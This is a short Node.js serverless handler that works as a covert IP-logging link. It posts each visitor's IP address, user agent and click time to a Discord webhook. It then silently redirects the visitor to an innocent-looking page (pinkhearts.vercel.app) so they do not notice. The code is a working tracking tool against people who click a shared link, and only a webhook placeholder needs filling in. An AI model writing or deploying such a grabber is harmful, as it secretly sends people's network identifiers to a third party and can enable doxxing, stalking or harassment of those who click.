import fetch from "node-fetch";

export default async function handler(req, res) {
  // Discord webhook URL
  const webhookURL = "YOUR_DISCORD_WEBHOOK_URL"; // <-- Replace this

  try {
    // Send info to Discord
    await fetch(webhookURL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: `Someone clicked your link!\nIP: ${req.headers['x-forwarded-for'] || req.socket.remoteAddress}\nUser Agent: ${req.headers['user-agent']}\nTime: ${new Date().toLocaleString()}`
      }),
    });
  } catch (err) {
    console.error("Failed to send webhook:", err);
  }

  // Redirect the user to the real page
  res.writeHead(302, { Location: "https://pinkhearts.vercel.app/" });
  res.end();
}
